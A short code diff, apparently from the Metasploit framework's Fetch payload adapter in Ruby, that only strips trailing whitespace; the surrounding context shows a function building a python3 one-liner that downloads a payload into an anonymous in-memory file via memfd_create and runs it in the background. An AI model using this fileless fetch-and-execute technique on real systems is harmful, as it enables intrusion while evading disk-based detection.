@@ -303,10 +303,10 @@ module Msf::Payload::Adapter::Fetch
 
     cmd
   end
-  
+
   # same idea as _generate_fileless function, but force creating anonymous file handle
   def _generate_fileless_python(get_file_cmd)
-    %Q<python3 -c 'import os;fd=os.memfd_create("",os.MFD_CLOEXEC);os.system(f"f=\\"/proc/{os.getpid()}/fd/{fd}\\";#{get_file_cmd};$f&")'> 
+    %Q<python3 -c 'import os;fd=os.memfd_create("",os.MFD_CLOEXEC);os.system(f"f=\\"/proc/{os.getpid()}/fd/{fd}\\";#{get_file_cmd};$f&")'>
   end
 
   def _generate_curl_command
